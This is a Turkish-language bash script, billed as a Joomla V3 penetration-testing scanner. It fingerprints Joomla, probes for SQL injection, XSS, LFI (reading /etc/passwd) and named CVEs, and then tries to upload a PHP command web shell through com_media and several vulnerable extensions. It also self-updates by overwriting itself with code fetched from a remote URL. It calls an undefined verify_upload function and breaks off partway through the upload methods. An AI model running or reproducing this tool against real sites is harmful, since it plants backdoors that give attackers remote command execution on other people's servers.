#!/bin/bash

# ──────────────────────────────────────────────────────────────
# Joomla V3 - Gelişmiş Güvenlik Tarama Aracı
# ──────────────────────────────────────────────────────────────
# Kullanım: ./joomla_v3_scanner.sh <hedef_url>
# Örnek:   ./joomla_v3_scanner.sh https://www.ornek-site.com
# ──────────────────────────────────────────────────────────────

# Renk Tanımları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Değişkenler
TARGET="${1}"
SCRIPT_VERSION="5"
SCRIPT_NAME="Joomla V3 Scanner"
PAYLOAD_FILE="b0yner.txt"

GITHUB_RAW_URL="https://raw.githubusercontent.com/KULLANICI_ADI/REPO_ADI/main/joom.sh"

check_update() {
    echo -e "  ${BLUE}[*]${NC} Guncelleme kontrol ediliyor..."
    LATEST_SCRIPT=$(curl -s --connect-timeout 5 --max-time 10 "$GITHUB_RAW_URL" 2>/dev/null)
    if [ -n "$LATEST_SCRIPT" ]; then
        LATEST_VERSION=$(echo "$LATEST_SCRIPT" | grep -oP '^SCRIPT_VERSION="\K[^"]+' | head -1)
        if [ -n "$LATEST_VERSION" ] && [ "$LATEST_VERSION" != "$SCRIPT_VERSION" ]; then
            echo -e "  ${YELLOW}[!]$NC Yeni bir surum bulundu: v$LATEST_VERSION (Mevcut: v$SCRIPT_VERSION)"
            echo -e "  ${GREEN}[*]$NC Script guncelleniyor..."
            echo "$LATEST_SCRIPT" > "$0"
            chmod +x "$0"
            echo -e "  ${GREEN}[?]$NC Guncelleme tamamlandi! Lutfen araci yeniden calistirin."
            exit 0
        fi
    fi
}

check_update

PAYLOAD_BASE="b0yner"
PAYLOAD_CONTENT='<?php system($_GET["cmd"]); ?>'
VULN_COUNT=0
upload_count=0
UPLOAD_TOTAL=35
declare -a upload_success
declare -a RCE_SHELLS
DETECTED="false"
VERSION="Bulunamadi"

# Banner
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║        ${GREEN}Joomla V3 Guvenlik Tarama Araci${RED}          ║${NC}"
echo -e "${RED}║        ${CYAN}Penetrasyon Testi Icin Tasarlanmistir${RED}     ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
echo ""

# Arguman kontrolu
if [ -z "$TARGET" ]; then
    echo -e "  ${RED}[!]${NC} Kullanim: $0 <hedef_url>"
    echo -e "  ${YELLOW}[*]${NC} Ornek: $0 https://www.ornek-site.com"
    exit 1
fi

# URL normalizasyonu
TARGET="${TARGET%/}"

echo -e "  ${CYAN}[*]${NC} Hedef: ${TARGET}"
echo -e "  ${CYAN}[*]${NC} Payload: ${PAYLOAD_FILE}"
echo -e "  ${CYAN}[*]${NC} Baslangic: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# ──────────────────────────────────────────────────────────────
# FAZ 1: Joomla Tespiti
# ──────────────────────────────────────────────────────────────
echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║         FAZ 1: Joomla Tespiti                   ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
echo ""

# Test 1: Meta generator
echo -e "  ${BLUE}[1/5]${NC} Meta generator etiketi kontrol ediliyor..."
META_CHECK=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/" 2>/dev/null | grep -io "joomla" | head -1)
if [ -n "$META_CHECK" ]; then
    echo -e "    ${GREEN}[✔]${NC} 'joomla' ifadesi bulundu!"
    DETECTED="true"
else
    echo -e "    ${YELLOW}[-]${NC} Meta generator'da bulunamadi."
fi

# Test 2: /administrator
echo -e "  ${BLUE}[2/5]${NC} /administrator kontrol ediliyor..."
ADMIN_CHECK=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 15 "${TARGET}/administrator/" 2>/dev/null)
if [ "$ADMIN_CHECK" = "200" ]; then
    echo -e "    ${GREEN}[✔]${NC} /administrator/ erisilebilir!"
    if [ "$DETECTED" = "false" ]; then DETECTED="true"; fi
else
    echo -e "    ${YELLOW}[-]${NC} /administrator/ erisilemedi (HTTP $ADMIN_CHECK)."
fi

# Test 3: /README.txt
echo -e "  ${BLUE}[3/5]${NC} /README.txt kontrol ediliyor..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/README.txt" 2>/dev/null)
if echo "$RESP" | grep -qi "joomla"; then
    echo -e "    ${GREEN}[✔]${NC} README.txt Joomla iceriyor!"
    if [ "$DETECTED" = "false" ]; then DETECTED="true"; fi
else
    echo -e "    ${YELLOW}[-]${NC} README.txt Joomla bilgisi bulunamadi."
fi

# Test 4: /language/en-GB/en-GB.xml
echo -e "  ${BLUE}[4/5]${NC} Dil dosyasi kontrol ediliyor..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/language/en-GB/en-GB.xml" 2>/dev/null)
if echo "$RESP" | grep -qi "joomla"; then
    echo -e "    ${GREEN}[✔]${NC} Dil dosyasi Joomla iceriyor!"
    if [ "$DETECTED" = "false" ]; then DETECTED="true"; fi
else
    echo -e "    ${YELLOW}[-]${NC} Dil dosyasi bulunamadi."
fi

# Test 5: robots.txt
echo -e "  ${BLUE}[5/5]${NC} robots.txt kontrol ediliyor..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/robots.txt" 2>/dev/null)
if echo "$RESP" | grep -qi "joomla\|administrator\|components"; then
    echo -e "    ${GREEN}[✔]${NC} robots.txt Joomla ipuclari iceriyor!"
    if [ "$DETECTED" = "false" ]; then DETECTED="true"; fi
else
    echo -e "    ${YELLOW}[-]${NC} robots.txt Joomla ipucu bulunamadi."
fi

if [ "$DETECTED" = "false" ]; then
    echo ""
    echo -e "  ${YELLOW}[!]${NC} Joomla tespit edilemedi, ancak devam ediliyor..."
fi

# ──────────────────────────────────────────────────────────────
# FAZ 2: Versiyon Tespiti (8+ Method)
# ──────────────────────────────────────────────────────────────
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║         FAZ 2: Versiyon Tespiti                 ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
echo ""

# Method 1: /administrator/manifests/files/joomla.xml
echo -e "  ${BLUE}[1/8]${NC} /administrator/manifests/files/joomla.xml kontrol..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/administrator/manifests/files/joomla.xml" 2>/dev/null)
V1=$(echo "$RESP" | grep -oP '<version>\K[^<]+' | head -1)
if [ -n "$V1" ]; then
    VERSION="$V1"
    echo -e "    ${GREEN}[✔]${NC} Versiyon: ${VERSION}"
fi

# Method 2: /language/en-GB/en-GB.xml
if [ "$VERSION" = "Bulunamadi" ]; then
    echo -e "  ${BLUE}[2/8]${NC} /language/en-GB/en-GB.xml kontrol..."
    RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/language/en-GB/en-GB.xml" 2>/dev/null)
    V2=$(echo "$RESP" | grep -oP '<version>\K[^<]+' | head -1)
    if [ -n "$V2" ]; then
        VERSION="$V2"
        echo -e "    ${GREEN}[✔]${NC} Versiyon: ${VERSION}"
    fi
fi

# Method 3: /README.txt
if [ "$VERSION" = "Bulunamadi" ]; then
    echo -e "  ${BLUE}[3/8]${NC} /README.txt kontrol..."
    RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/README.txt" 2>/dev/null)
    V3=$(echo "$RESP" | grep -oP 'Joomla! \K[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
    if [ -n "$V3" ]; then
        VERSION="$V3"
        echo -e "    ${GREEN}[✔]${NC} Versiyon: ${VERSION}"
    fi
fi

# Method 4: /libraries/src/Version.php
if [ "$VERSION" = "Bulunamadi" ]; then
    echo -e "  ${BLUE}[4/8]${NC} /libraries/src/Version.php kontrol..."
    RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/libraries/src/Version.php" 2>/dev/null)
    V4=$(echo "$RESP" | grep -oP "RELEASE\s*=\s*'\K[^']+" | head -1)
    if [ -n "$V4" ]; then
        VDEV=$(echo "$RESP" | grep -oP "DEV_LEVEL\s*=\s*'\K[^']+" | head -1)
        VERSION="${V4}.${VDEV}"
        echo -e "    ${GREEN}[✔]${NC} Versiyon: ${VERSION}"
    fi
fi

# Method 5: /libraries/cms/version/version.php
if [ "$VERSION" = "Bulunamadi" ]; then
    echo -e "  ${BLUE}[5/8]${NC} /libraries/cms/version/version.php kontrol..."
    RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/libraries/cms/version/version.php" 2>/dev/null)
    V5=$(echo "$RESP" | grep -oP "RELEASE\s*=\s*'\K[^']+" | head -1)
    if [ -n "$V5" ]; then
        VDEV=$(echo "$RESP" | grep -oP "DEV_LEVEL\s*=\s*'\K[^']+" | head -1)
        VERSION="${V5}.${VDEV}"
        echo -e "    ${GREEN}[✔]${NC} Versiyon: ${VERSION}"
    fi
fi

# Method 6: /libraries/joomla/version.php
if [ "$VERSION" = "Bulunamadi" ]; then
    echo -e "  ${BLUE}[6/8]${NC} /libraries/joomla/version.php kontrol..."
    RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/libraries/joomla/version.php" 2>/dev/null)
    V6=$(echo "$RESP" | grep -oP "RELEASE\s*=\s*'\K[^']+" | head -1)
    if [ -n "$V6" ]; then
        VDEV=$(echo "$RESP" | grep -oP "DEV_LEVEL\s*=\s*'\K[^']+" | head -1)
        VERSION="${V6}.${VDEV}"
        echo -e "    ${GREEN}[✔]${NC} Versiyon: ${VERSION}"
    fi
fi

# Method 7: /includes/version.php
if [ "$VERSION" = "Bulunamadi" ]; then
    echo -e "  ${BLUE}[7/8]${NC} /includes/version.php kontrol..."
    RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/includes/version.php" 2>/dev/null)
    V7=$(echo "$RESP" | grep -oP "RELEASE\s*=\s*'\K[^']+" | head -1)
    if [ -n "$V7" ]; then
        VDEV=$(echo "$RESP" | grep -oP "DEV_LEVEL\s*=\s*'\K[^']+" | head -1)
        VERSION="${V7}.${VDEV}"
        echo -e "    ${GREEN}[✔]${NC} Versiyon: ${VERSION}"
    fi
fi

# Method 8: /templates/system/css/system.css
if [ "$VERSION" = "Bulunamadi" ]; then
    echo -e "  ${BLUE}[8/8]${NC} /templates/system/css/system.css (CSS fingerprint) kontrol..."
    RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/templates/system/css/system.css" 2>/dev/null)
    if echo "$RESP" | grep -qi "joomla\|system.css"; then
        echo -e "    ${YELLOW}[?]${NC} CSS dosyasi mevcut (versiyon tespit edilemedi)"
    fi
fi

if [ "$VERSION" != "Bulunamadi" ]; then
    echo ""
    echo -e "  ${GREEN}[✔]${NC} Joomla Versiyonu: ${GREEN}${VERSION}${NC}"
else
    echo ""
    echo -e "  ${YELLOW}[!]${NC} Versiyon tespit edilemedi."
fi

# ──────────────────────────────────────────────────────────────
# FAZ 3: Guvenlik Acigi Taramasi (50+ Test)
# ──────────────────────────────────────────────────────────────
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║         FAZ 3: Guvenlik Acigi Taramasi          ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
echo ""

# === CVE Testleri ===

# CVE-2025-22207: com_scheduler SQLi
echo -e "  ${BLUE}[CVE-2025-22207]${NC} com_scheduler SQLi test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_scheduler&task=api.run&id=1'" 2>/dev/null)
if echo "$RESP" | grep -qi "error\|exception\|sql\|syntax"; then echo -e "    ${RED}[VULN]${NC} SQLi muhtemel!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi

# CVE-2025-22213: Media Manager File Upload
echo -e "  ${BLUE}[CVE-2025-22213]${NC} Media Manager dosya yukleme test..."
TOKEN=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_media&task=api.display" 2>/dev/null | grep -oP '"csrf\.token":"\K[^"]+' | head -1)
if [ -n "$TOKEN" ]; then echo -e "    ${RED}[VULN]${NC} Media Manager API token alindi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Token alinamadi."; fi

# CVE-2025-25227: 2FA Bypass
echo -e "  ${BLUE}[CVE-2025-25227]${NC} 2FA bypass test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/administrator/index.php?option=com_users&task=user.login" 2>/dev/null)
if echo "$RESP" | grep -qi "token\|twofactor\|2fa"; then echo -e "    ${YELLOW}[?]${NC} 2FA sayfasi mevcut."; else echo -e "    ${YELLOW}[-]${NC} 2FA tespit edilemedi."; fi

# CVE-2026-21630: com_content webservice SQLi
echo -e "  ${BLUE}[CVE-2026-21630]${NC} com_content webservice SQLi test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/api/index.php/v1/content/articles?filter[search]=1'" 2>/dev/null)
if echo "$RESP" | grep -qi "error\|exception\|sql\|syntax"; then echo -e "    ${RED}[VULN]${NC} SQLi muhtemel!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi

# CVE-2026-21629: com_ajax ACL bypass
echo -e "  ${BLUE}[CVE-2026-21629]${NC} com_ajax ACL bypass test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_ajax&format=json" 2>/dev/null)
if echo "$RESP" | grep -qi "error\|exception\|access"; then echo -e "    ${YELLOW}[?]${NC} ACL bypass olabilir."; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi

# CVE-2026-23898: com_joomlaupdate file delete
echo -e "  ${BLUE}[CVE-2026-23898]${NC} com_joomlaupdate dosya silme test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/administrator/index.php?option=com_joomlaupdate" 2>/dev/null)
if echo "$RESP" | grep -qi "update\|joomlaupdate"; then echo -e "    ${YELLOW}[?]${NC} Guncelleme sayfasi mevcut."; else echo -e "    ${YELLOW}[-]${NC} Guncelleme sayfasi bulunamadi."; fi

# CVE-2026-23899: Improper access check
echo -e "  ${BLUE}[CVE-2026-23899]${NC} Improper access check test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/administrator/index.php" 2>/dev/null)
if echo "$RESP" | grep -qi "login\|form\|password"; then echo -e "    ${YELLOW}[?]${NC} Admin giris sayfasi mevcut."; else echo -e "    ${YELLOW}[-]${NC} Admin sayfasina erisilemedi."; fi

# CVE-2025-63082: XSS data URLs
echo -e "  ${BLUE}[CVE-2025-63082]${NC} XSS data URL test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=1&Itemid=1" 2>/dev/null)
if echo "$RESP" | grep -qi "data:text/html"; then echo -e "    ${RED}[VULN]${NC} XSS data URL kullanimi tespit edildi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} XSS tespit edilemedi."; fi

# CVE-2025-63083: XSS pagebreak
echo -e "  ${BLUE}[CVE-2025-63083]${NC} XSS pagebreak test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&layout=pagebreak&id=1" 2>/dev/null)
if echo "$RESP" | grep -qi "error\|exception"; then echo -e "    ${YELLOW}[?]${NC} Pagebreak hatasi var."; else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi

# CVE-2023-23752: API Improper Access
echo -e "  ${BLUE}[CVE-2023-23752]${NC} API improper access test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/api/index.php/v1/config/application?public=true" 2>/dev/null)
if echo "$RESP" | grep -qi "sitename\|password\|db\|secret"; then echo -e "    ${RED}[VULN]${NC} API ile hassas bilgiler sizdi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} API guvenli."; fi

# CVE-2015-8562: Unserialize RCE
echo -e "  ${BLUE}[CVE-2015-8562]${NC} Unserialize RCE test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 -X POST "${TARGET}/index.php?option=com_users&view=registration" -d "user[password]=test" 2>/dev/null)
if echo "$RESP" | grep -qi "error\|exception"; then echo -e "    ${YELLOW}[?]${NC} Unserialize zafiyeti olabilir."; else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi

# CVE-2018-17856: com_joomlaupdate ACL
echo -e "  ${BLUE}[CVE-2018-17856]${NC} com_joomlaupdate ACL test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_joomlaupdate" 2>/dev/null)
if echo "$RESP" | grep -qi "update\|upload\|package"; then echo -e "    ${YELLOW}[?]${NC} Guncelleme bileseni mevcut."; else echo -e "    ${YELLOW}[-]${NC} Guncelleme bileseni bulunamadi."; fi

# CVE-2017-8917: com_fields SQLi
echo -e "  ${BLUE}[CVE-2017-8917]${NC} com_fields SQLi test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_fields&view=fields&list[fullordering]=1'" 2>/dev/null)
if echo "$RESP" | grep -qi "error\|exception\|sql\|syntax"; then echo -e "    ${RED}[VULN]${NC} SQLi muhtemel!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi

# CVE-2021-23132: com_media directory traversal/RCE
echo -e "  ${BLUE}[CVE-2021-23132]${NC} com_media directory traversal test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_media&view=images&tmpl=component&folder=../../../etc" 2>/dev/null)
if echo "$RESP" | grep -qi "error\|exception"; then echo -e "    ${YELLOW}[?]${NC} Directory traversal olabilir."; else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi

# CVE-2013-5576: Trailing dot bypass
echo -e "  ${BLUE}[CVE-2013-5576]${NC} Trailing dot bypass test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/administrator/." 2>/dev/null)
if echo "$RESP" | head -1 | grep -c "403\|404" > /dev/null 2>&1; then
    echo -e "    ${YELLOW}[-]${NC} Engellendi."
else
    echo -e "    ${RED}[VULN]${NC} Trailing dot bypass calisiyor olabilir!"
    VULN_COUNT=$((VULN_COUNT + 1))
fi

# CVE-2019-7743: phar:// object injection
echo -e "  ${BLUE}[CVE-2019-7743]${NC} phar:// object injection test..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&id=1&view=article" 2>/dev/null)
if echo "$RESP" | grep -qi "phar"; then echo -e "    ${RED}[VULN]${NC} phar:// kullanimi tespit edildi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi

# === LFI Testleri ===
echo ""
echo -e "  ${BLUE}[*]${NC} LFI (Local File Inclusion) testleri..."

# LFI - template
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=1&Itemid=1&template=../../../../etc/passwd" 2>/dev/null)
if echo "$RESP" | grep -qi "root:"; then echo -e "    ${RED}[VULN]${NC} LFI - template parametresi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} LFI bulunamadi."; fi

# LFI - controller
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&controller=../../../../etc/passwd" 2>/dev/null)
if echo "$RESP" | grep -qi "root:"; then echo -e "    ${RED}[VULN]${NC} LFI - controller parametresi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} LFI bulunamadi."; fi

# LFI - view
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=../../../../etc/passwd" 2>/dev/null)
if echo "$RESP" | grep -qi "root:"; then echo -e "    ${RED}[VULN]${NC} LFI - view parametresi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} LFI bulunamadi."; fi

# === SQLi Testleri ===
echo ""
echo -e "  ${BLUE}[*]${NC} SQLi (SQL Injection) testleri..."

# SQLi - id parameter - her payload ayri ayri test ediliyor
SQLPAYLOAD1="'"
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=${SQLPAYLOAD1}" 2>/dev/null)
if echo "$RESP" | grep -qi "sql\|syntax\|mysql\|error\|exception\|odbc"; then
    echo -e "    ${RED}[VULN]${NC} SQLi - id parametresi (single quote)!"
    VULN_COUNT=$((VULN_COUNT + 1))
fi

SQLPAYLOAD2="1' OR '1'='1"
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=${SQLPAYLOAD2}" 2>/dev/null)
if echo "$RESP" | grep -qi "sql\|syntax\|mysql\|error\|exception\|odbc"; then
    echo -e "    ${RED}[VULN]${NC} SQLi - id parametresi (OR injection)!"
    VULN_COUNT=$((VULN_COUNT + 1))
fi

SQLPAYLOAD3='1" OR "1"="1'
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=${SQLPAYLOAD3}" 2>/dev/null)
if echo "$RESP" | grep -qi "sql\|syntax\|mysql\|error\|exception\|odbc"; then
    echo -e "    ${RED}[VULN]${NC} SQLi - id parametresi (double quote injection)!"
    VULN_COUNT=$((VULN_COUNT + 1))
fi

# === XSS Testleri ===
echo ""
echo -e "  ${BLUE}[*]${NC} XSS (Cross-Site Scripting) testleri..."

XSSPAYLOAD="<script>alert(1)</script>"
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=1&q=${XSSPAYLOAD}" 2>/dev/null)
if echo "$RESP" | grep -qi "<script>alert(1)</script>"; then echo -e "    ${RED}[VULN]${NC} XSS yansitiliyor!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} XSS bulunamadi."; fi

# === Acik Dizin Testleri ===
echo ""
echo -e "  ${BLUE}[*]${NC} Acik dizin testleri..."

for DIR in "images" "media" "tmp" "logs" "cache" "backups" "administrator/logs"; do
    RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/${DIR}/" 2>/dev/null)
    if echo "$RESP" | grep -qi "Index of\|Directory listing\|<title>Index of"; then
        echo -e "    ${RED}[VULN]${NC} Acik dizin: /${DIR}/"
        VULN_COUNT=$((VULN_COUNT + 1))
    fi
done

# === Configuration Dosyalari ===
echo ""
echo -e "  ${BLUE}[*]${NC} Hassas dosya testleri..."

for FILE in "configuration.php" "configuration.php.bak" "configuration.php.old" "configuration.php~" ".htaccess" "db_backup.sql" "backup.sql"; do
    RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/${FILE}" 2>/dev/null)
    if echo "$RESP" | grep -qi "password\|host\|user\|db\|<?php"; then
        echo -e "    ${RED}[VULN]${NC} Hassas dosya: /${FILE}"
        VULN_COUNT=$((VULN_COUNT + 1))
    fi
done

# === Installation Dizini ===
echo ""
echo -e "  ${BLUE}[*]${NC} Kurulum dizini testi..."
RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/installation/" 2>/dev/null)
if echo "$RESP" | grep -qi "joomla\|install\|configuration\|language"; then
    echo -e "    ${RED}[VULN]${NC} /installation/ dizini mevcut (yeniden kurulum tehlikesi)!"
    VULN_COUNT=$((VULN_COUNT + 1))
else
    echo -e "    ${YELLOW}[-]${NC} /installation/ dizini bulunamadi."
fi

# ──────────────────────────────────────────────────────────────
# Component Wordlist Indir
# ──────────────────────────────────────────────────────────────
echo ""
echo -e "  ${BLUE}[*]${NC} Component wordlist indiriliyor..."
COMPONENTS=$(curl -s --connect-timeout 10 --max-time 20 \
    "https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/joomla.txt" 2>/dev/null | head -200)
if [ -z "$COMPONENTS" ]; then
    COMPONENTS="simpleimageupload simpleswfupload jfuploader adsmanager expose jce rsform phocadownload phocagallery docman cookbook uploader simplephoto fabrik sexycontactform collector gmapfp"
fi
COMPONENT_COUNT=$(echo "$COMPONENTS" | wc -w)
echo -e "    ${GREEN}[✔]${NC} $COMPONENT_COUNT component yuklendi."

# ──────────────────────────────────────────────────────────────
# FAZ 4: Dosya Yukleme Denemeleri (35+ Method)
# ──────────────────────────────────────────────────────────────
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║         FAZ 4: Dosya Yukleme Denemeleri         ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
echo ""

# Payload dosyasini olustur
PAYLOAD_PATH="/tmp/${PAYLOAD_FILE}"
echo '<?php system($_GET["cmd"]); ?>' > "$PAYLOAD_PATH"
echo -e "  ${GREEN}[✔]${NC} Payload olusturuldu: ${PAYLOAD_PATH}"
echo ""

# Method 1: Genel upload - com_media
echo -e "  ${BLUE}[1/${UPLOAD_TOTAL}]${NC} Genel upload (com_media) deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/index.php?option=com_media&task=file.upload&format=json" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "com_media" "${TARGET}/images/${PAYLOAD_FILE}"
fi

# Method 2: images klasorune direkt yazma
echo -e "  ${BLUE}[2/${UPLOAD_TOTAL}]${NC} /images/ klasoru deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/images/" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "images/" "${TARGET}/images/${PAYLOAD_FILE}"
fi

# Method 3: media klasoru
echo -e "  ${BLUE}[3/${UPLOAD_TOTAL}]${NC} /media/ klasoru deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/media/" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "media/" "${TARGET}/media/${PAYLOAD_FILE}"
fi

# Method 4: tmp klasoru
echo -e "  ${BLUE}[4/${UPLOAD_TOTAL}]${NC} /tmp/ klasoru deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/tmp/" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "tmp/" "${TARGET}/tmp/${PAYLOAD_FILE}"
fi

# Method 5: com_simpleimageupload (EDB-37364)
echo -e "  ${BLUE}[5/${UPLOAD_TOTAL}]${NC} com_simpleimageupload deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/index.php?option=com_simpleimageupload&task=upload" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "com_simpleimageupload" "${TARGET}/images/${PAYLOAD_FILE}"
fi

# Method 6: com_simpleswfupload (EDB-37378)
echo -e "  ${BLUE}[6/${UPLOAD_TOTAL}]${NC} com_simpleswfupload deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/index.php?option=com_simpleswfupload&task=upload" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "com_simpleswfupload" "${TARGET}/images/${PAYLOAD_FILE}"
fi

# Method 7: com_jfuploader (EDB-15353)
echo -e "  ${BLUE}[7/${UPLOAD_TOTAL}]${NC} com_jfuploader deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_jfuploader/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "com_jfuploader" "${TARGET}/components/com_jfuploader/uploads/${PAYLOAD_FILE}"
fi

# Method 8: com_adsmanager
echo -e "  ${BLUE}[8/${UPLOAD_TOTAL}]${NC} com_adsmanager deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_adsmanager/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "com_adsmanager" "${TARGET}/images/com_adsmanager/${PAYLOAD_FILE}"
fi

# Method 9: com_expose - uploadimg.php (CVE-2007-3932 / EDB-4194)
echo -e "  ${BLUE}[9/${UPLOAD_TOTAL}]${NC} com_expose (uploadimg.php) deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "userfile=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_expose/uploadimg.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "com_expose" "${TARGET}/images/expose/${PAYLOAD_FILE}"
fi

# Method 10: JCE Editor Image Manager
echo -e "  ${BLUE}[10/${UPLOAD_TOTAL}]${NC} JCE Editor deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=upload&version=1576" 2>/dev/null)
